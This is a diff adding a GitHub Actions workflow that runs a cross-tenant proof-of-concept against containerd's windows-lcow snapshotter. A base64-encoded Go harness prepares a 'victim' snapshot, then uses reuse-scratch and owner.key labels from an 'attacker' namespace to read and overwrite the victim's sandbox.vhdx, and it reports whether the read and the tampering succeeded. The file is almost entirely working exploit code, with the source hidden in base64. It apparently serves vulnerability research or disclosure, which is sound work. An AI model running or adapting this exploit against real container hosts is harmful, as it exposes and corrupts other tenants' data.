@@ -1,0 +1,75 @@
+name: D17 cross-tenant real VHDX (no stub)
+on:
+  workflow_dispatch:
+
+jobs:
+  cross:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - name: Setup containerd + harness + create REAL VHDX
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          $base='C:\ctdvhd'
+          $snaproot='C:\ctdpoc\root\io.containerd.snapshotter.v1.windows-lcow'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\go","$snaproot" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
+          $src='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiY3J5cHRvL3NoYTI1NiIKICAgICJlbmNvZGluZy9oZXgiCiAgICAiZm10IgogICAgIm9zIgogICAgInBhdGgvZmlsZXBhdGgiCiAgICAic3RyaW5ncyIKCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY2xpZW50IgogICAgImdpdGh1Yi5jb20vY29udGFpbmVyZC9jb250YWluZXJkL3YyL2NvcmUvc25hcHNob3RzIgopCgpmdW5jIG1haW4oKSB7CiAgICBhZGRyIDo9IGBcXC5ccGlwZVxjdGQtZ3JwY2AKICAgIG5zIDo9ICJkMTdjcm9zcyIKICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgeyBmbXQuUHJpbnRsbigiQ0xJRU5UX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpIH0KICAgIGRlZmVyIGMuQ2xvc2UoKQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2UoIndpbmRvd3MtbGNvdyIpCgogICAgLy8gVGVuYW50IEIgKHZpY3RpbSk6IG5vcm1hbCBQcmVwYXJlLiBTdHViIGdpdmVzIHRoZSBzY3JhdGNoIGEga25vd24gYm9keSwKICAgIC8vIHRoZW4gd2Ugb3ZlcndyaXRlIHNhbmRib3gudmhkeCB3aXRoIGEgZGlzdGluY3RpdmUgbWFya2VyIHRvIHByb3ZlIGEgcmVhZC4KICAgIHZpY3RpbUtleSA6PSAidmljdGltLXRlbmFudC1zbmFwIgogICAgdm0sIGVyciA6PSBzcy5QcmVwYXJlKGN0eCwgdmljdGltS2V5LCAiIiwgc25hcHNob3RzLldpdGhMYWJlbHMobWFwW3N0cmluZ11zdHJpbmd7ImQxNy5yb2xlIjogInZpY3RpbSJ9KSkKICAgIGlmIGVyciAhPSBuaWwgeyBmbXQuUHJpbnRsbigiVklDVElNX1BSRVBBUkVfRVJSOiIsIGVycik7IG9zLkV4aXQoMSkgfQogICAgZm10LlByaW50bG4oIlZJQ1RJTV9NT1VOVFM6Iiwgdm0pCiAgICB2aWN0aW1TYW5kYm94IDo9IGZpbGVwYXRoLkpvaW4odm1bMF0uU291cmNlLCAic2FuZGJveC52aGR4IikKICAgIHZiLCBfIDo9IG9zLlJlYWRGaWxlKHZpY3RpbVNhbmRib3gpCiAgICB2aCA6PSBzaGEyNTYuU3VtMjU2KHZiKQogICAgZm10LlByaW50bG4oIlZJQ1RJTV9TQU5EQk9YX0xFTjoiLCBsZW4odmIpKQogICAgZm10LlByaW50bG4oIlZJQ1RJTV9TQU5EQk9YX0ZJUlNUMTY6IiwgaGV4LkVuY29kZVRvU3RyaW5nKHZiWzptaW4oMTYsbGVuKHZiKSldKSkKICAgIGZtdC5QcmludGxuKCJWSUNUSU1fU0FOREJPWF9TSEEyNTY6IiwgaGV4LkVuY29kZVRvU3RyaW5nKHZoWzpdKSkKICAgIG1hcmtlciA6PSAiRDE3X0NST1NTX1RFTkFOVF9WSUNUSU1fTUFSS0VSXzlGM0EyQiIKICAgIGlmIGVyciA6PSBvcy5Xcml0ZUZpbGUodmljdGltU2FuZGJveCwgW11ieXRlKG1hcmtlciksIDA2MDApOyBlcnIgIT0gbmlsIHsKICAgICAgICBmbXQuUHJpbnRsbigiTUFSS0VSX1dSSVRFX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiVklDVElNX1NBTkRCT1g6IiwgdmljdGltU2FuZGJveCkKCiAgICAvLyBUZW5hbnQgQSAoYXR0YWNrZXIpOiByZXVzZS1zY3JhdGNoICsgb3duZXIua2V5IGNvbnRhaW5pbmcgQidzIHNuYXBzaG90IG5hbWUuCiAgICBhdHRhY2tlcktleSA6PSAiYXR0YWNrZXItdGVuYW50LXNuYXAiCiAgICBsYWJlbHMgOj0gbWFwW3N0cmluZ11zdHJpbmd7CiAgICAgICAgImNvbnRhaW5lcmQuaW8vc25hcHNob3QvaW8ubWljcm9zb2Z0LmNvbnRhaW5lci5zdG9yYWdlLnJldXNlLXNjcmF0Y2giOiAidHJ1ZSIsCiAgICAgICAgImNvbnRhaW5lcmQuaW8vc25hcHNob3QvaW8ubWljcm9zb2Z0Lm93bmVyLmtleSI6ICAgICAgICAgICAgICAgICAgICAgICAidmljdGltLXRlbmFudCIsCiAgICB9CiAgICBhbSwgZXJyIDo9IHNzLlByZXBhcmUoY3R4LCBhdHRhY2tlcktleSwgIiIsIHNuYXBzaG90cy5XaXRoTGFiZWxzKGxhYmVscykpCiAgICBpZiBlcnIgIT0gbmlsIHsgZm10LlByaW50bG4oIkFUVEFDS0VSX1BSRVBBUkVfRVJSOiIsIGVycik7IG9zLkV4aXQoMSkgfQogICAgZm10LlByaW50bG4oIkFUVEFDS0VSX01PVU5UUzoiLCBhbSkKICAgIGF0dGFja2VyU2FuZGJveCA6PSBmaWxlcGF0aC5Kb2luKGFtWzBdLlNvdXJjZSwgInNhbmRib3gudmhkeCIpCiAgICBmbXQuUHJpbnRsbigiQVRUQUNLRVJfU0FOREJPWDoiLCBhdHRhY2tlclNhbmRib3gpCgogICAgLy8gSW5zcGVjdCB0aGUgbW91bnQgQSBhY3R1YWxseSByZWNlaXZlcy4KICAgIGZpLCBlcnIgOj0gb3MuTHN0YXQoYXR0YWNrZXJTYW5kYm94KQogICAgZm10LlByaW50bG4oIkxTVEFUX01PREU6IiwgZmkuTW9kZSgpLCAiZXJyOiIsIGVycikKICAgIHRhcmdldCwgZXJyIDo9IG9zLlJlYWRsaW5rKGF0dGFja2VyU2FuZGJveCkKICAgIGZtdC5QcmludGxuKCJSRUFETElOSzoiLCB0YXJnZXQsICJlcnI6IiwgZXJyKQogICAgZGF0YSwgcmVyciA6PSBvcy5SZWFkRmlsZShhdHRhY2tlclNhbmRib3gpCiAgICBmbXQuUHJpbnRsbigiUkVBRF9MRU46IiwgbGVuKGRhdGEpLCAiZXJyOiIsIHJlcnIpCiAgICBmbXQuUHJpbnRsbigiUkVBRF9DT05URU5UOiIsIHN0cmluZyhkYXRhKSkKICAgIGZtdC5QcmludGxuKCJNQVJLRVJfRk9VTkQ6Iiwgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoZGF0YSksIG1hcmtlcikpCgogICAgLy8gUHJvdmUgd3JpdGUtdGhyb3VnaCAoaW50ZWdyaXR5KTogYXR0YWNrZXIgd3JpdGVzIHZpYSB0aGUgc3ltbGluaywKICAgIC8vIHRoZW4gcmVhZCB0aGUgdmljdGltJ3Mgb3duIHBhdGggZGlyZWN0bHkgdG8gY29uZmlybSB0aGUgY2hhbmdlLgogICAgdGFtcGVyIDo9ICJEMTdfQVRUQUNLRVJfVEFNUEVSXzdDMUUiCiAgICBpZiB3ZXJyIDo9IG9zLldyaXRlRmlsZShhdHRhY2tlclNhbmRib3gsIFtdYnl0ZSh0YW1wZXIpLCAwNjAwKTsgd2VyciAhPSBuaWwgewogICAgICAgIGZtdC5QcmludGxuKCJUQU1QRVJfV1JJVEVfRVJSOiIsIHdlcnIpCiAgICB9IGVsc2UgewogICAgICAgIHZkYXRhLCBfIDo9IG9zLlJlYWRGaWxlKHZpY3RpbVNhbmRib3gpCiAgICAgICAgZm10LlByaW50bG4oIlZJQ1RJTV9BRlRFUl9UQU1QRVI6Iiwgc3RyaW5nKHZkYXRhKSkKICAgICAgICBmbXQuUHJpbnRsbigiVEFNUEVSX1BST1ZFTjoiLCBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyh2ZGF0YSksIHRhbXBlcikpCiAgICB9CiAgICBpZiB0YXJnZXQgIT0gIiIgJiYgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoZGF0YSksIG1hcmtlcikgewogICAgICAgIGZtdC5QcmludGxuKCJDUk9TU19URU5BTlRfUkVBRF9QUk9WRU49dHJ1ZSIpCiAgICB9IGVsc2UgewogICAgICAgIGZtdC5QcmludGxuKCJDUk9TU19URU5BTlRfUkVBRF9QUk9WRU49ZmFsc2UiKQogICAgfQp9Cg=='; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($src))
+          # Create a REAL VHDX with distinctive content via diskpart (no Hyper-V needed)
+          $vhdx="$snaproot\scratch.vhdx"
+          $dp=@"
+          create vdisk file=$vhdx maximum=64 type=expandable
+          attach vdisk
+          create partition primary
+          format fs=ntfs quick
+          assign letter=V
+          exit
+          "@
+          $dp | Out-File -FilePath "$base\mk.txt" -Encoding ascii
+          diskpart /s "$base\mk.txt" 2>&1 | Select-Object -Last 8
+          Start-Sleep -Seconds 2
+          Set-Content -Path 'V:\VICTIM_TENANT_SECRET.txt' -Value 'D17_REAL_VHDX_VICTIM_SECRET_4B8C' -Encoding ascii
+          $detach=@"
+          select vdisk file=$vhdx
+          detach vdisk
+          exit
+          "@
+          $detach | Out-File -FilePath "$base\det.txt" -Encoding ascii
+          diskpart /s "$base\det.txt" 2>&1 | Select-Object -Last 5
+          Get-Item $vhdx | Select-Object FullName,Length | Format-List
+          $h=Get-FileHash $vhdx -Algorithm SHA256
+          Write-Output "ORIGINAL_VHDX_SHA256=$($h.Hash)"
+
+      - name: Build harness + start daemon + run
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdvhd'
+          $env:GO111MODULE='on'
+          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\cross.exe" . 2>&1 | Tee-Object "$base\build.log"
+          Write-Output "HARNESS_RC=$LASTEXITCODE"
+          $p=Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
+          Write-Output "CONTAINERD_PID=$($p.Id)"
+          Start-Sleep -Seconds 8
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
+          Write-Output '=== REAL VHDX CROSS-TENANT PoC ==='
+          & "$base\cross.exe" 2>&1 | Tee-Object -FilePath "$base\cross.out"
+          Write-Output "HARNESS_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 2
+          Write-Output '=== daemon scratch branch ==='
+          if (Test-Path "$base\stderr.log") { Select-String -Path "$base\stderr.log" -Pattern 'scratch|prepare snapshot' | Select-Object -Last 8 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-realvhdx-evidence
+          path: |
+            C:\ctdvhd\cross.out
+            C:\ctdvhd\build.log
+            C:\ctdvhd\stderr.log
+          if-no-files-found: warn
